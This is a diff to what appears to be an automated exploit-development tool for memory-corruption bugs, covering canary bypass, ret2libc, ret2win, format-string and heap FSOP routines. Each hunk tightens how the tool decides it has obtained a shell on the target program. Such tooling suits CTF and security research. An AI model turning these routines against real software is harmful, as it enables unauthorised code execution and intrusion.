@@ -1133,7 +1133,7 @@ def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_t
                 except (BrokenPipeError, OSError):
                     break                                       # wrong parity
                 out = _read_until(p, time.time() + timeout, quiet=1.5)
-                if marker in out:
+                if marker in out and (b"echo " + marker) not in out:
                     return {"ok": True, "canary": canary, "base": base,
                             "system": base + system_off, "align": align,
                             "output": out[:400].decode("latin-1", "ignore")}
@@ -1317,7 +1317,7 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                 except (BrokenPipeError, OSError):
                     continue
                 out = _read_until(p, time.time() + timeout, quiet=1.2)
-                if marker in out or b"/bin/sh" in out or b"$ " in out:
+                if marker in out and (b"echo " + marker) not in out:
                     return {"ok": True, "canary": canary, "pie_base": (pie_base if pie else None),
                             "win": base + int(win_off),
                             "output": out[:400].decode("latin-1", "ignore")}
@@ -1475,7 +1475,7 @@ def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read
                 except (BrokenPipeError, OSError):
                     continue
                 out = _read_until(p, time.time() + timeout, quiet=1.2)
-                if marker in out or b"/bin/sh" in out or b"$ " in out:
+                if marker in out and (b"echo " + marker) not in out:
                     return {"ok": True, "pie_base": pie_base, "win": win, "target": target,
                             "fmt_offset": int(fmt_offset),
                             "output": out[:400].decode("latin-1", "ignore")}
@@ -1581,7 +1581,7 @@ def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, s
                     except (BrokenPipeError, OSError):
                         continue
                     out = _shell_out(p, sel)
-                    if marker in out or b"/bin/sh" in out:
+                    if marker in out and (b"echo " + marker) not in out:
                         return {"ok": True, "route": "one-shot", "canary": canary, "pie_base": pie_base,
                                 "libc_base": libc_base, "system": libc_base + system_off,
                                 "output": out[:400].decode("latin-1", "ignore")}
@@ -1635,7 +1635,7 @@ def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, s
                 except (BrokenPipeError, OSError):
                     continue
                 out = _shell_out(p, sel)
-                if marker in out or b"/bin/sh" in out:
+                if marker in out and (b"echo " + marker) not in out:
                     return {"ok": True, "route": "two-stage", "canary": canary, "pie_base": pie_base,
                             "libc_base": libc2, "system": libc2 + system_off,
                             "output": out[:400].decode("latin-1", "ignore")}
@@ -2555,7 +2555,7 @@ def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_da
         except (BrokenPipeError, OSError):
             return {"ok": False, "reason": "crashed before the shell", "libc_base": base}
         out = _read_until(p, time.time() + timeout, quiet=1.5)
-        if marker in out:
+        if marker in out and (b"echo " + marker) not in out:
             return {"ok": True, "libc_base": base, "heap_page": heap_page, "slots": used,
                     "stdout": stdout_addr, "poison_size": poison_size,
                     "wide_addr": wide_addr or None,
@@ -2840,7 +2840,7 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
                 for seq in (tuple(exit_seqs) or (b"",)):
                     out = _op(seq, 0.6) if seq else b""
                     out += _op(b"echo " + marker + b"\n", 1.2)
-                    if marker in out:
+                    if marker in out and (b"echo " + marker) not in out:
                         return {"ok": True, "libc_base": base, "fp": slot, "cells": shown,
                                 "fp_name": "main's saved return address",
                                 "exit_seq": seq, "finish": "system", "align": align,
@@ -2879,7 +2879,7 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
                 for seq in (tuple(exit_seqs) or (b"",)):
                     out = _op(seq, 0.6) if seq else b""
                     out += _op(b"echo " + marker + b"\n", 1.2)
-                    if marker in out:
+                    if marker in out and (b"echo " + marker) not in out:
                         return {"ok": True, "libc_base": base, "fp": scratch, "cells": shown,
                                 "fp_name": "a FILE of our own in the target's array",
                                 "exit_seq": seq, "finish": T["plan"],
@@ -2925,7 +2925,7 @@ def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_s
             for seq in (tuple(exit_seqs) or (b"",)):
                 out = _op(seq, 0.6) if seq else b""
                 out += _op(b"echo " + marker + b"\n", 1.2)
-                if marker in out:
+                if marker in out and (b"echo " + marker) not in out:
                     return {"ok": True, "libc_base": base, "fp": fp, "wide_data": wide,
                             "cells": shown, "fp_name": T["fp_name"], "exit_seq": seq,
                             "targets": {k: v for k, v in T.items() if k != "fp_name"}}
